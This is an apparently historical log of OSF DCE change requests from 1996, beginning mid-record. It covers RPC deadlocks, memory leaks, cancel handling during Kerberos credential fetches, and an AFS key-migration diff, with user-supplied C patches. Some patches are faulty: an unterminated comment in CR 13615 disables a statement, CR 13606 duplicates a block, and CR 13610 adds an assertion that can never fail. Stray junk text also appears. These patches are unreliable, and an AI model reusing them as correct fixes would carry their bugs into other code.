            RPC_CN_CALL_SM_TRC_STATE (crep, (RPC_CN_PKT_CALL_ID ((rpc_cn_packet_p_t) RPC_CN_CREP_SEND_HDR (crep)))); \
        } \
        else \
        { \
            (*fragbuf->fragbuf_dealloc)(fragbuf); \
        } \
    } \
    else \
    { \
        (*fragbuf->fragbuf_dealloc)(fragbuf); \
    } \
}

[08/26/96 public]
Wouldn't a simple
                crep_state = crep->call_state;
Be a simpler replacement of all those assignments?



CR Number                     : 13616
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : possible mutex deadlock with krb_info
Reported Date                 : 8/23/96
Found in Baseline             : 1.1
Found Date                    : 8/23/96
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : krbdgclt.c krbclt.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/23/96 public]
In 'rpc__krb_get_tkt' and 'rpc__krb_dg_way_handler' while waiting on the the
krb_info condition if a cred_refresh is being executed in 'rpc__krb_get_tkt'.
If a cancel occurred while waiting on the condition krb_info, the thread will
hold the mutex illegally.  Protective code must be implemented to
handle cancels during the condition wait.
-------------------------------------------------------------------------------
Make the following changes in rpc__krb_dg_way_handler:
Replace the following existing statements:
    if (krb_info->auth_info.authn_level != rpc_c_authn_level_none) {

        while (krb_info->cred_fetching) {
            RPC_KRB_INFO_COND_WAIT(krb_info);
        }
With the following new statements:
    if (krb_info->auth_info.authn_level != rpc_c_authn_level_none) {
#if defined (AIX_PROD) || defined (IBMOS2) 
        st = rpc_s_ok;
        TRY
#endif
        while (krb_info->cred_fetching) {
            RPC_KRB_INFO_COND_WAIT(krb_info);
        }
#if defined (AIX_PROD) || defined (IBMOS2)
        CATCH(pthread_cancel_e)
          st = rpc_s_call_cancelled;
        ENDTRY

    if (st != rpc_s_ok)
                goto out;
#endif
-----------------------------------------------------------------------------
Make the following changes in rpc__krb_get_tkt:
Replace the existing function rpc__krb_get_tkt with the following new one:
PRIVATE unsigned32 rpc__krb_get_tkt
#ifdef _DCE_PROTO_
(
        rpc_krb_info_p_t krb_info
)
#else
(krb_info)
    rpc_krb_info_p_t krb_info;
#endif
{
    error_status_t st = error_status_ok;
    unsigned32 oldexp, exp;
#if defined(AIX_PROD) || defined(IBMOS2) /* CMVC 19979 */
    sec_krb_cred volatile tmp_cred=NULL;
#endif

    RPC_KRB_INFO_LOCK_ASSERT(krb_info);
#if defined(AIX_PROD) || defined(IBMOS2) /* CMVC 16500 */
    TRY
#endif
    while (krb_info->cred_fetching) {
        RPC_DBG_PRINTF(rpc_e_dbg_auth, 3,
            ("(rpc__krb_get_tkt) waiting for someone else\n"));
        RPC_KRB_INFO_COND_WAIT(krb_info);
    }
#if defined(AIX_PROD) || defined(IBMOS2) /* CMVC 16500 */
    CATCH(pthread_cancel_e)
        st = rpc_s_call_cancelled;
    CATCH_ALL
        /*
         * An unexpected exception was raised by threads
         */

        RPC_DCE_SVC_PRINTF ((
        DCE_SVC(RPC__SVC_HANDLE, "%s"),
        rpc_svc_recv,
        svc_c_sev_fatal | svc_c_action_abort,
        rpc_m_unexpected_exc,
        "rpc__krb_get_tkt" ));
    ENDTRY
    /*
     * If status is bad, we caught a cancel
     */

    if (st != rpc_s_ok)
                return st;
#endif
    if (krb_info->creds_valid) {
        RPC_DBG_PRINTF(rpc_e_dbg_auth, 3,
            ("(rpc__krb_get_tkt) already valid\n"));
    } else{
        krb_info->cred_fetching = 1;
#if !defined(AIX_PROD) && !defined(IBMOS2) /* CMVC 19979 */
        /*
         * Lets not free the cred until we have a valid cred from
         * security
         */
        sec_krb_cred_free(&krb_info->cred);
#endif

        oldexp = krb_info->expiration;
        RPC_KRB_INFO_UNLOCK(krb_info);

        /*
         * !!! this is a cancel point here..
         * on cancel, must set cred_fetching to 0.
         */
        RPC_DBG_PRINTF(rpc_e_dbg_auth, 3,
            ("(rpc__krb_get_tkt) fetching credentials\n"));
#if defined (AIX_PROD) || defined (IBMOS2) /* CMVC 10262,16500 */
        /*
         * Change 10262 to return a cancel status instead of reraising
         * the cancellation.
         *
         * We should probably disable general cancellability here because the
         * security runtime's state is unknown if it gets cancelled...
         */

        TRY {
#endif
#if defined(_AIX41) && defined(_KERNEL)  /* change u to dce_u  CMVC 10866 CMVC 1165 CMVCst = sec_krb_get_cred (krb_info->auth_info.dce_u.auth_identity,
#else
        st = sec_krb_get_cred (krb_info->auth_info.u.auth_identity,
#endif
            krb_info->server,
            krb_info->auth_info.authn_level,
            krb_info->auth_info.authz_protocol,
#if defined(AIX_PROD) || defined(IBMOS2) /* CMVC 19979 */
            (sec_krb_cred*)&tmp_cred, &exp);
#else
            &krb_info->cred, &exp);
#endif


        RPC_KRB_INFO_LOCK (krb_info);
        krb_info->expiration = exp;

        if (st != rpc_s_ok) {
            RPC_DBG_GPRINTF
                (("(rpc__krb_get_tkt) refresh failed (status %x)\n", st));
        }
        else
        {
            RPC_DBG_PRINTF(rpc_e_dbg_auth, 3,
                ("(rpc__krb_get_tkt) fetch succeeded\n"));
            krb_info->creds_valid = 1;
#if defined(AIX_PROD) || defined(IBMOS2) /* CMVC 19979 */
            /*
             * We have new valid cred. Lets free the old and replace
             * with the new.
             */
            rpc__krb_rel_cred_ref (&krb_info->cred_ref);
            rpc__krb_get_cred_ref (&krb_info->cred_ref, tmp_cred);
#endif
        }
#if defined (AIX_PROD) || defined (IBMOS2) /* CMVC 10262,16500 */
        }
        CATCH(pthread_cancel_e) {
#if defined(AIX_PROD) || defined(IBMOS2) /* CMVC 19979 */
            /*
             * If a cancel occured lets make sure the cred from
             * security is freed.
             */
            if (tmp_cred) sec_krb_cred_free((sec_krb_cred *)&tmp_cred);
#endif
            RPC_KRB_INFO_LOCK (krb_info);
            st = rpc_s_call_cancelled;
        }
        CATCH_ALL {
            /*
             * An unexpected exception was raised
             */

             RPC_DCE_SVC_PRINTF ((
             DCE_SVC(RPC__SVC_HANDLE, "%s"),
             rpc_svc_recv,
             svc_c_sev_fatal | svc_c_action_abort,
             rpc_m_unexpected_exc,
             "rpc__krb_get_tkt" ));
        }
        ENDTRY
#endif
        krb_info->cred_fetching = 0;
        RPC_KRB_INFO_COND_BROADCAST(krb_info);
    }
    RPC_KRB_INFO_LOCK_ASSERT(krb_info);
    return st;
}



CR Number                     : 13615
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Exception caught on client RPC
Reported Date                 : 8/23/96
Found in Baseline             : 1.1
Found Date                    : 8/23/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : cnassoc.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public
Reporteption                  : lin1@austin.ibm.com

[8/23/96 public]
The association shutdown occurs during a rpc call when executing client
stub code.  To perform the call, the 'rpc_call_start' function will
setup the connection (association) to the server in 
'rpc__cn_assoc_request'. The shutdown request occurs while performing
'rpc__cn_assoc_open'. Since rpc does not currently have a method
to handle the shutdown status in 'rpc__cn_assoc_request'
code will be modified to retry the assoc open with a new association.

-------------------------------------------------------------------------
Make the following changes in rpc__cn_assoc_request (cnassoc.c):
Add the follwing local variable:
    boolean             retry = false;
Replace the following statements:
                /*
                 * Return a failure immediately if:
                 *
                 * 1) the association open failed because it was
                 *    rejected or a local error occurred OR
                 *
                 * 2) the connection request failed and the binding
                 *    timeout was not infinite.
                 */
                if (!rpc__cn_network_connect_fail (*st))
                {
                    return (NULL);
                }
                else
                {
                    if (binding_r->common.timeout != rpc_c_binding_infinite_timout)                 {
                        return (NULL);
                    }
                }

With the follwing:
                /*
                 * Return a failure immediately if:
                 *
                 * 1) the association open failed because it was
                 *    rejected or a local error occurred OR
                 *
                 * 2) the connection request failed and the binding
                 *    timeout was not infinite.
                 */
#if defined(AIX_PROD) || defined(IBMOS2) 
                /* If we received an 'association shutdown' request, lets
                   try the 'association open' request one more time with a new
                   assocation */
                if (*st != rpc_s_assoc_shutdown)
                {
#endif
                if (!rpc__cn_network_connect_fail (*st))
                {
                    return (NULL);
                }
                else
                {
                    if (binding_r->common.timeout != rpc_c_binding_infinite_timout)                 {
                        return (NULL);
                    }
                }
#if defined(AIX_PROD) || defined(IBMOS2) 
                }
                else if (retry) return(NULL); /* The retry failed, lets return /
                     else retry=true; /* Lets try one more time */
#endif



CR Number                     : 13614
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : nsi calls
Short Description             : rpc_ns_entry_inq_resolution() does not handle cds link cases.
Reported Date                 : 8/22/96
Found in Baseline             : 1.2.1
Found Date                    : 8/22/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/22/96 public]

rpc_ns_entry_inq_resolution() returns bogus unresolved name when a cds link
is part of the input name. In the following example, "resolve" is a simple
program which simply calls rpc_ns_entry_inq_resolution() and prints out the
resolved and unresolved names:

dcecp> link create /.:/l -to /.:/sec
dcecp> ./resolve /.:/sec/abc
Resolved part is /.../down_11/sec, unresolved is abc
dcecp> ./resolve /.:/l/abc
Resolved part is /.../down_11/sec, unresolved is c
dcecp> link create /.:/ll -to /.:/sec
dcecp> ../dce/resolve /.:/ll/abc      
Resolved part is /.../down_11/sec, unresolved is bc
dcecp>

The reason for this strange behavior is that the function assumes that 
no link is used and the resolved part is the same as the first part
of the single name, and return the residual part by copying the rest from the
orginal name starting from the index based on the length of the resolved
part. When in the case of a cds link, the resolved part is the actual (target)
name, its length is NOT the same as the link length, hence the strange
residual part result.

Somewhere, the code needs to be smart to realize that a cds link is in place,
and return the resolved part as: 1. the actual name, 2), the link part.



CR Number                     : 13613
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : login
Short Description             : Allow AFS principals to migrate to DCE via Krb5 Beta6 AFS string_to_key()
Reported Date                 : 8/21/96
Found in Baseline             : 1.2.1
Found Date                    : 8/21/96
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/21/96 public]

Doug Engert has suggested the following enhancement to allow AFS principals
to migrate to DCE without changing their passwords. Doug writes:

I see that the K5b6 has a afsstring2key.c routine which is only called
from the string2key.c. In string2key.c the comments refer to "cheating"
by calling the afstring2key.c if the salt length is -1.  The use of a
-1 for a salt length may have many other consequences, and
ramifications to the code in different places. 

I would like to suggest an additional method of "cheating" be added, so if
the salt starts with the string "AFS:" that the rest of the string is
interpreted as the AFS salt, and the afsstring2key.c be called. 

This method is transparent to the rest of the code which deals with
salts, such as preauthentication.

I am using a DCE security server as the KDC, and have successfully
copied keys from our AFS cell "anl.gov" to the DCE security registry
in our DCE cell, "dce.anl.gov". Unlike the K5 database, the DCE
security registry allows the salt to be stored in the entry, and can
be anything, including "AFS:anl.gov".

This presents a nice migration path from AFS to DCE, even when
the realm/cell names differ. The keys can be copied, and users do not
have to change their passwords during the conversion.   

*** ,string2key.c       Tue Apr  9 17:47:24 1996
--- string2key.c        Tue Aug 20 10:28:49 1996
***************
*** 78,83 ****
--- 78,104 ----
      key = keyblock->contents;
  
      if (salt) {
+         /* ANL Change */
+         /* we can store AFS keys in DCE, and set the salt such that 
+          * it is preceeded by AFS:
+          * If so, pass the rest of the salt to the afs_string_to_key
+          * But it is cheating, and expecting the salt.data to be a
+          * null terminated string. This may not be the case from DCE.
+          */
+         if ((salt->length >= 4) && !memcmp(salt->data,"AFS:",4)) {
+               krb5_data afssalt;
+               krb5_error_code ret;
+               afssalt.length = salt->length - 4;
+               afssalt.data = (char*)malloc(afssalt.length+1);
+               if (!afssalt.data)
+                       return(ENOMEM);
+               memcpy(afssalt.data,salt->data + 4,afssalt.length);
+               afssalt.data[afssalt.length] = '\0'; /* make it a string */
+               ret = mit_afs_string_to_key (eblock, keyblock, data, &afssalt);
+               free(afssalt.data);
+               return(ret);
+         } else
+               /* end of ANL change */
        if (salt->length == -1) {
        /* cheat and do AFS string2key instead */
        return mit_afs_string_to_key (eblock, keyblock, data, salt);


Another method is to use the new padata type in K5 beta 6, KRB5_PADATA_AFS3_SALT,
which says to use the afsstring2key. This would be another approach to 
doing the same thing. But this requires changes to the server as well. 
This should probable be added at some future time when many of the other 
K5b* code is integrated in.



CR Number                     : 13612
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : llegal state transition in CN server call SM
Reported Date                 : 8/20/96
Found in Baseline             : 1.1
Found Date                    : 8/20/96
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : cnsclsm.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/20/96 public]
This problem only occured in very high stressed env.
The server was transmitting a fault packet to the client.
The rpc__cn_call_transmit_fault routine         
in send_call_fault_action_rtn was executed and change the server state
from RPC_C_SERVER_CALL_CALL_REQUEST to RPC_C_SERVER_CALL_CALL_COMPLETED.
The server receiver thread received another request when server was making
the above state change.  Therefore, an illeagal state transition
occured.



CR Number                     : 13611
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Server App deadlocks in context rundown
Reported Date                 : 8/20/96
Found in Baseline             : 1.1
Found Date                    : 8/20/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : rpc/idl/lib/ctxeecli.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/20/96 public]
The server process is in a deadlock situation, therefore, any requests
sent from client will not acquire services.  A thread owns the 
rpc_g_global_mutex.  A number of threads are blocked including
the exector thread and the listening thread.  This thread is waiting
on a condition in rpc_ss_rundown_client which never occured.
rpc_ss_rundown_client did reveal an unprotect condition wait against
cancelation. ALso the refcount in the client handle is -1.  This value
is the cause of the hang in rpc_ss_rundown_client.  According to
the idl code, the reference count of the client handle should
never reach below zero.  This fix is considered a workaround
since the true nature of the problem is not yet revealed.
---------------------------------------------------------------------------
Make the changes in rpc_ss_add_to_callee_client:
After the following existing statments:
    while (ndr_true)
    {
        if ( ctx_client == this_client->client )
        {
            ++this_client->count;
Add the following new statements:
            /* If the ref_count of this client is zero, set it to one. */
            /* I believe the ref count is used to determine whether the */
            /* server stub is finished with this client handle.  At this */
            /* point, the stub is not finished and therefore will later */
            /* decrement the ref count in rpc_ss_ctx_client_ref_count_d_2. */
            /* This change will prevent the ref count from decrementing */
            /* below -1 */
            if (!(this_client->ref_count))
            {
               ++this_client->ref_count;
            }



CR Number                     : 13610
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : cdsadv core dump in rpc__dg_scall_alloc
Reported Date                 : 8/20/96
Found in Baseline             : 1.1
Found Date                    : 8/20/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : dg.h dgsct.h
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/20/96 public]
The abort occurs since the reference count of the scte is 255.
Looking at the core file reveals the call to be a broadcast, maybe type.
Since the call is maybe, rpc will execute the call even if the sequence is 
old or is a duplicate.  rpc will try to uphold the call since a maybe
call does not require a client response. The particular 'scte' which
created the core dump seems to have a number of maybe calls (most
in idle state) stored in the maybe chain.  The limit of the refernce
count should indicate the chain to be near 255 mark.  If we increase 
the reference count to a double bye, the limit would increase to
65536. 
----------------------------------------------------------------------------
Make the following changes to rpc_dg_sct_elt_t (dg.h):
Replace the following existing field:
    unsigned8 refcnt;                   /* scte reference count */
With the following new field:
    unsigned16 refcnt;                   /* scte reference count */
---------------------------------------------------------------------------
Make the following changes to dgsct.h:
Replace the existing statement:
/*
 * R P C _ D G _ S C T _ R E F E R E N C E
 *
 * Increment the reference count for the SCTE.
 */
#define RPC_DG_SCT_REFCNT_MAX  255

#define RPC_DG_SCT_REFERENCE(scte) { \
    assert((scte)->refcnt < RPC_DG_SCT_REFCNT_MAX); \
    (scte)->refcnt++; \
}
With the new statements:
/*
 * R P C _ D G _ S C T _ R E F E R E N C E
 *
 * Increment the reference count for the SCTE.
 */
#define RPC_DG_SCT_REFERENCE(scte) { \
    assert((scte)->refcnt < 65536); \
    (scte)->refcnt++; \
}

[9/04/96 public]

I think that you mean 65535.

[10/10/96 public]

Fixed in 1.1 maintenance.



CR Number                     : 13608
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : DG RPC orphaning packets
Reported Date                 : 8/19/96
Found in Baseline             : 1.1
Found Date                    : 8/19/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : dgexec.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/19/96 public]
Cannot do a cd /: on any of the DFS servers or client in the cell.
It was found out that rpc could not allocate ant more memory.

A few points in the dg code (user space, not kernel) have been 
identified where the DG packets are not being freed in failure
conditions.  With user space RPC this is not generally a problem
because the packet pool is very large, but with KRPC, the packet
pool is restricted to onlt a few hundred
packets at most, so orphaning packets, ie not returning them
to the packet pool, can easily cause a resource threshold to be
hit.  This is especially true in situations where the core DCE services
become unavailable, and error conditions are expected.
-----------------------------------------------------------------------
Make the follwing changes in rpc__dg_execute_call (dgexec.c):
Replace the following existing statements:
            /*
             * We want to make this check because it's better to be safe
             * than sorry regarding at-most-once semantics.  It's
             * conceivable that the connection became WAY validated *after*
             * this call had passed it's initial filtering (if nothing
             * else, it should protect us from other potential coding
             * errors :-)
             */
            if (scall->c.call_seq != scall->scte->high_seq)
            {
                RPC_DBG_PRINTF(rpc_e_dbg_general, 2,
                    ("(execute_call) Old sequence, previous=%lu [%s]\n",
                    scall->scte->high_seq, rpc__dg_act_seq_string(hdrp)));
                goto END_OF_CALL;
            }
With the following new statements:
            /*
             * We want to make this check because it's better to be safe
             * than sorry regarding at-most-once semantics.  It's
             * conceivable that the connection became WAY validated *after*
             * this call had passed it's initial filtering (if nothing
             * else, it should protect us from other potential coding
             * errors :-)
             */
            if (scall->c.call_seq != scall->scte->high_seq)
            {
                RPC_DBG_PRINTF(rpc_e_dbg_general, 2,
                    ("(execute_call) Old sequence, previous=%lu [%s]\n",
                    scall->scte->high_seq, rpc__dg_act_seq_string(hdrp)));
#if defined(AIX_PROD) && defined(_KERNEL) /* CMVC: 14579 */
                KRPC_LOG_TRACE(0, ("rpc execute_call: old sequence"));
#endif /* AIX_PROD && _KERNEL */
#if defined(AIX_PROD) || defined(IBMOS2) /* CMVC 15224 */
                if (iove.buff_dealloc != NULL)
                    RPC_FREE_IOVE_BUFFER(&iove);
#endif
                goto END_OF_CALL;
            }
------------------------------------------------------------------------------
Replace the following existing statements:
            /*
             * The WAY validation routine must be called with the connection
             * unlocked.  Due to locking hierarchy and the fact that we
             * unlocked the scall, we've opened up a window... check if
             * it's safe to continue.
             */
            RPC_LOCK(0);
            RPC_DG_CALL_LOCK(&scall->c);
            if (scall->c.state != rpc_e_dg_cs_recv)
            {
                RPC_UNLOCK(0);
                goto END_OF_CALL;
            }
Wth the following new statements:
            /*
             * The WAY validation routine must be called with the connection
             * unlocked.  Due to locking hierarchy and the fact that we
             * unlocked the scall, we've opened up a window... check if
             * it's safe to continue.
             */
            RPC_LOCK(0);
            RPC_DG_CALL_LOCK(&scall->c);
            if (scall->c.state != rpc_e_dg_cs_recv)
            {
                RPC_UNLOCK(0);
#if defined(AIX_PROD) && defined(_KERNEL) /* CMVC 15224 */
                KRPC_LOG_TRACE(0,
                    ("rpc execute_call: not in rx state before way, fwa %d",
                    force_way_auth));
#endif /* AIX_PROD && _KERNEL */
#if defined(AIX_PROD) || defined(IBMOS2) /* CMVC 15224, 23059 */
                if (!force_way_auth && (iove.buff_dealloc != NULL))
                    RPC_FREE_IOVE_BUFFER(&iove);
#endif /* AIX_PROD || IBMOS2 */
                goto END_OF_CALL;
            }
------------------------------------------------------------------------------
Replace the following existing statements:
            /*
             * Before continuing, we've "opened up" the call (due to
             * the unlock/lock) and we need to check if it is safe to
             * continue...
             */
            if (scall->c.state != rpc_e_dg_cs_recv)
                goto END_OF_CALL;

            if (st != rpc_s_ok)
            {
                reject_st = rpc_s_who_are_you_failed;
                goto AFTER_CALL_TO_STUB;
            }
            else
            {
                if (scall->c.call_seq != scall->scte->high_seq)
                {
                    RPC_DBG_PRINTF(rpc_e_dbg_general, 2,
                        ("(rpc__dg_execute_call) Old sequence, previous=%lu [%s\n",
                        scall->scte->high_seq, rpc__dg_act_seq_string(hdrp)));
                    goto END_OF_CALL;
                }
            }

With the following new statements:
            /*
             * Before continuing, we've "opened up" the call (due to
             * the unlock/lock) and we need to check if it is safe to
             * continue...
             */
#if defined(AIX_PROD) || defined(IBMOS2) /* CMVC 15224, 23059 */
            if (scall->c.state != rpc_e_dg_cs_recv) {
#if defined(AIX_PROD) && defined(_KERNEL) /* CMVC 15224 */
                KRPC_LOG_TRACE(0,
            ("rpc execute_call: not in rx state after way, fwa %d, way st %d",
                    force_way_auth, st));
#endif /* AIX_PROD && _KERNEL */
                if (!force_way_auth && (iove.buff_dealloc != NULL))
                    RPC_FREE_IOVE_BUFFER(&iove);
                goto END_OF_CALL;
            }
#else /* AIX_PROD || IBMOS2 */
            if (scall->c.state != rpc_e_dg_cs_recv)
                goto END_OF_CALL;
#endif /* AIX_PROD || IBMOS2 */

            if (st != rpc_s_ok)
            {
                reject_st = rpc_s_who_are_you_failed;
#if defined(AIX_PROD) && defined(_KERNEL) /* CMVC: 14579 */
                KRPC_LOG_TRACE(0,
                    ("rpc execute_call: way call failed st %d", st));
#endif /* AIX_PROD && _KERNEL */
                goto AFTER_CALL_TO_STUB;
            }
            else
            {
                if (scall->c.call_seq != scall->scte->high_seq)
                {
                    RPC_DBG_PRINTF(rpc_e_dbg_general, 2,
                        ("(rpc__dg_execute_call) Old sequence, previous=%lu [%s]\n",
                        scall->scte->high_seq, rpc__dg_act_seq_string(hdrp)));
#if defined(AIX_PROD) && defined(_KERNEL) /* CMVC: 14579 */
                    KRPC_LOG_TRACE(0,
                        ("rpc execute_call: Old sequence after way call"));
#endif /* AIX_PROD && _KERNEL */
#if defined(AIX_PROD) || defined(IBMOS2) /* CMVC 15224, 23059 */
                    if (!force_way_auth && (iove.buff_dealloc != NULL))
                        RPC_FREE_IOVE_BUFFER(&iove);
#endif
                    goto END_OF_CALL;
                }
            }
-------------------------------------------------------------------------------



CR Number                     : 13607
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Swapper grows to 250MEG with CDS Daemon running
Reported Date                 : 8/19/96
Found in Baseline             : 1.1
Found Date                    : 8/19/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : cnxfer.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/19/96 public]
CDS Daemeon holding memory.  When adding aliases with LAN server API,
swapper will continually grow.  As the number of aliases increases,
the swapper grows faster. After 1000 aliases are added, the swapper
is at 250MEG. Then next time aliases are added, the swapper
grows fastersince the original 1000 were never deleted and it only 
adds about 600 before swapper.
---------------------------------------------------------------------
When after the iovec is transmitted the buffers in the vec are deallocated.
If this is an authenticated call, the counter for the number of the
buffers needs to be decremented, so that the deallocator will not free the
very last buffer which contains the security trailer info,
The leak is because two such decrements were there in the call chain.
The second decrement causes the last data buffer not being deallocated
in each transmission of fragment. As a result, there are multiple
512K leaks in each call and an about 12K/second leak on 530 when 
running the test.
-----------------------------------------------------------------------------
Make the following changes in the rpc__cn_add_new_iovector_elmt (cnxfer.c)
Replace the following existing statements:    
        /*
         * Deallocate all the buffers except the 1st and last.
         * Then adjust iovector so that we have only 2 elements:
         * the header plus the current stub data.
         */
        if ((call_rep->sec != NULL
             && RPC_CN_CREP_IOVLEN (call_rep) > 3)
            || (call_rep->sec == NULL
                && RPC_CN_CREP_IOVLEN (call_rep) > 2))
        {
            /*
             * rpc__cn_dealloc_buffered_data will always skip the
             * first iovector element (protocol header).  Decrementing
             * iovlen will cause it to skip the last element also.
             */
            RPC_CN_CREP_IOVLEN (call_rep) --;
            rpc__cn_dealloc_buffered_data (call_rep);

            /*
             * Now we rebuild the iovector.  It will have only
             * 2 elements: the header, plus the iovector element
             * which we are processing.
             */
            if (call_rep->sec != NULL)
            {
                RPC_CN_CREP_IOVLEN (call_rep) = 3;
            }
            else
            {
                RPC_CN_CREP_IOVLEN (call_rep) = 2;
            }
            RPC_CN_CREP_CUR_IOV_INDX (call_rep) = 1;
            iov_p = &(RPC_CN_CREP_IOV (call_rep)[1]);
        }

With the following new statements:
        /*
         * Deallocate all the buffers except the 1st and last.
         * Then adjust iovector so that we have only 2 elements:
         * the header plus the current stub data.
         */
        if (RPC_CN_CREP_IOVLEN (call_rep) > 2)
        {
            /*
             * rpc__cn_dealloc_buffered_data will always skip the
             * first iovector element (protocol header).  Decrementing
             * iovlen will cause it to skip the last element also.
             */
            RPC_CN_CREP_IOVLEN (call_rep) --;
            rpc__cn_dealloc_buffered_data (call_rep);

            /*
             * Now we rebuild the iovector.  It will have only
             * 2 elements: the header, plus the iovector element
             * which we are processing.
             */
            RPC_CN_CREP_IOVLEN (call_rep) = 2;
            RPC_CN_CREP_CUR_IOV_INDX (call_rep) = 1;
            iov_p = &(RPC_CN_CREP_IOV (call_rep)[1]);
        }

        /*
         * Make sure to reserve an iovector element for the protocol
         * trailer if required.
         */
        if (call_rep->sec != NULL)
        {
            RPC_CN_CREP_IOVLEN (call_rep)++;
        }









]

     eeRE



CR Number                     : 13606
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : daemons dumping core in md5.MD5Update
Reported Date                 : 8/19/96
Found in Baseline             : 1.1
Found Date                    : 8/19/96
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : cnrcvr.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/19/96 public]
During testing integeration of Digital DCE for Window NT with DCE 1.2 for
AIX 4.1 cds daemons core dump serveral times.
--------------------------------------------------------------------------
The fix to receive_packet() in cnrcvr.c:
Before the follwing statements, which are located in the last two statements
in end_for (i = 0;; i++) :
Add the following statements:

        /*
        * Deallocate the raw packet if it exists.
        */
        if (assoc->raw_packet_p != NULL)
        {
            rpc__cn_fragbuf_free (assoc->raw_packet_p);
            assoc->raw_packet_p = NULL;
        }
        /*
        * Deallocate the raw packet if it exists.
        */
        if (assoc->raw_packet_p != NULL)
        {
            rpc__cn_fragbuf_free (assoc->raw_packet_p);
            assoc->raw_packet_p = NULL;
        }



CR Number                     : 13604
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : rpc_mgmt_ep_elt_inq_done got exception
Reported Date                 : 8/19/96
Found in Baseline             : 1.1
Found Date                    : 8/19/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : comep.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/19/96 public]
rpc_mgmt_ep_elt_inq_next call got communication failure for udp. Then the
following API rpc_mgmt_ep_elt_inq_done got exception.
--------------------------------------------------------------------------
chp->num_ents in rpc_mgmt_ep_elt_inq_next() of comep.c was set to non-zero
as an output parameter after the call failed due to communication failure.
The counter is used in rpc_mgmt_ep_elt_inq_done to deallocate tower 
structure.  When communication failure occurs, the tower chain was not
allocated but the counter is not zero.  Memory access violation happens
in rpc_mgmt_ep_elt_inq_done() when it tries to free the non-existing
towers.
----------------------------------------------------------------------------
Make the following changes in rpc_mgmt_ep_elt_inq_next() (comep.c):
After the following existing statements:
                if (*status == rpc_s_call_cancelled)
                    pthread_cancel(pthread_self());
Add the following statements:
              chp->num_ents = 0;

